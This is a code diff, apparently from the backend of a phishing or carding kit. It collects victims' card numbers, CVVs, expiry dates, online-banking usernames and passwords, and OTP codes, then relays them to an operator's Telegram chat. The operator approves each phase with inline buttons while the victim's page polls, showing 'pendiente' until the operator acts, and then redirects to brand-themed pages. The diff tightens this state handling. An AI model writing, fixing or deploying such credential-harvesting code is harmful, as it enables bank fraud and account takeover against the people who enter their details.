@@ -44,7 +44,6 @@ async function initDB() {
         );
     `);
     
-    // Asegurar que las columnas nuevas existan si la tabla ya existía
     await pool.query(`
         ALTER TABLE pagos_pendientes
           ADD COLUMN IF NOT EXISTS usuario_banco VARCHAR(120),
@@ -61,7 +60,6 @@ async function initDB() {
 }
 initDB().catch(err => console.error('❌ initDB:', err));
 
-// --- TELEGRAM HELPERS ---
 async function tgSendMessage(text, replyMarkup) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
@@ -118,18 +116,18 @@ async function enviarSolicitudATelegram(pago) {
     }
 }
 
-// --- ENDPOINTS ---
 app.post('/api/crear-pago', async (req, res) => {
     const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso } = req.body || {};
     
     if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });
 
     try {
+        // 🔥 FORZAMOS ESTADO PENDIENTE Y FASE CORRECTA
         const result = await pool.query(
-            `INSERT INTO pagos_pendientes (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso, fase_actual)
-             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)
+            `INSERT INTO pagos_pendientes (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso, fase_actual, estado)
+             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12, 'pendiente')
              ON CONFLICT (solicitud_id) DO UPDATE
-               SET numero_tarjeta = EXCLUDED.numero_tarjeta, cvv = EXCLUDED.cvv, vencimiento = EXCLUDED.vencimiento, marca_tarjeta = EXCLUDED.marca_tarjeta, banco_emisor = EXCLUDED.banco_emisor, usuario_banco = COALESCE(EXCLUDED.usuario_banco, pagos_pendientes.usuario_banco), password_banco = COALESCE(EXCLUDED.password_banco, pagos_pendientes.password_banco), codigo_otp = COALESCE(EXCLUDED.codigo_otp, pagos_pendientes.codigo_otp), paso = COALESCE(EXCLUDED.paso, pagos_pendientes.paso), updated_at = NOW()
+               SET numero_tarjeta = EXCLUDED.numero_tarjeta, cvv = EXCLUDED.cvv, vencimiento = EXCLUDED.vencimiento, marca_tarjeta = EXCLUDED.marca_tarjeta, banco_emisor = EXCLUDED.banco_emisor, usuario_banco = COALESCE(EXCLUDED.usuario_banco, pagos_pendientes.usuario_banco), password_banco = COALESCE(EXCLUDED.password_banco, pagos_pendientes.password_banco), codigo_otp = COALESCE(EXCLUDED.codigo_otp, pagos_pendientes.codigo_otp), paso = COALESCE(EXCLUDED.paso, pagos_pendientes.paso), estado = 'pendiente', updated_at = NOW()
              RETURNING *`,
             [solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido', usuario_banco || null, password_banco || null, codigo_otp || null, paso || 'crear', paso === 'otp' ? 'otp' : 'credenciales']
         );
@@ -140,7 +138,6 @@ app.post('/api/crear-pago', async (req, res) => {
         if (esNueva) {
             await enviarSolicitudATelegram(pago);
         } else {
-            // 🔥 ESTO ES LO QUE ACTUALIZA EL MENSAJE EN TELEGRAM
             const replyMarkup = {
                 inline_keyboard: [[
                     { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
@@ -164,13 +161,24 @@ app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
         if (result.rows.length === 0) return res.status(404).json({ success: false, error: 'No encontrado' });
         const row = result.rows[0];
 
-        if (row.estado === 'aprobado_credenciales') return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
-        if (row.estado === 'rechazado_credenciales') return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });
+        // 🔥 FASE 1: SOLO SI EL ESTADO ES EXPLÍCITAMENTE 'aprobado_credenciales'
+        if (row.estado === 'aprobado_credenciales') {
+            return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
+        }
+        if (row.estado === 'rechazado_credenciales') {
+            return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });
+        }
 
-        if (row.estado === 'aprobado' || row.otp_aprobado === true) return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a || 'exito.html'}` });
-        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });
+        // 🔥 FASE 2: SOLO SI EL ESTADO ES EXPLÍCITAMENTE 'aprobado' (OTP final)
+        if (row.estado === 'aprobado') {
+            return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a || 'exito.html'}` });
+        }
+        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') {
+            return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });
+        }
 
-        return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual });
+        // 🔥 SI NO ESTÁ APROBADO, SIEMPRE RESPONDE 'pendiente'
+        return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual || 'credenciales' });
     } catch (err) {
         return res.status(500).json({ success: false, error: 'Error' });
     }
@@ -193,10 +201,12 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
         if (accion === 'aprobar') {
             if (!estaEnFaseOTP) {
+                // Aprueba credenciales
                 await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado_credenciales', credenciales_aprobadas = TRUE, updated_at = NOW() WHERE solicitud_id = $1`, [solicitud_id]);
                 await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
                 if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + construirTextoPago(pago));
             } else {
+                // Aprueba OTP final
                 const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                 await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado', otp_aprobado = TRUE, fase_actual = 'completado', redirigir_a = $1, updated_at = NOW() WHERE solicitud_id = $2`, [archivo, solicitud_id]);
                 await tgAnswerCallback(cq.id, '✅ Pago aprobado');
